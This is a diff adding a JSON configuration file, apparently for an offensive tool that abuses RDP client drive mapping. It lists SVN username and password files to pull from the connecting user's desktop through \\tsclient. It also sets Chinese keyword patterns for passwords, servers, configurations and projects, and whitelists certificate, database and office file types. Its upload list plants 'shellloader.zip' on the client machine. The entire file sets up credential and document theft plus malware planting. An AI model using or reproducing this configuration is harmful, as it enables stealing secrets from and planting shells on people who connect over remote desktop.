@@ -1,0 +1,37 @@
+{
+  "download_file_list": [
+    "\\\\tsclient\\C\\Users\\funnywolf\\Desktop\\dic_username_svn.txt",
+    "\\\\tsclient\\C\\Users\\funnywolf\\Desktop\\dic_password_svn.txt"
+  ],
+  "download_file_regex_list": [
+    "服务器",
+    "项目",
+    "密码",
+    "配置",
+    "网站",
+    "手册",
+    "方案"
+  ],
+  "file_suffix_whitelist": [
+    "cer",
+    "csv",
+    "db",
+    "doc",
+    "docx",
+    "pdf",
+    "pem",
+    "ppt",
+    "pptx",
+    "rtf",
+    "txt",
+    "xls",
+    "xlsx"
+  ],
+  "file_suffix_blacklist": [
+    "iso"
+  ],
+  "download_file_maxsize": 10485760,
+  "upload_file_list": [
+    "shellloader.zip"
+  ]
+}
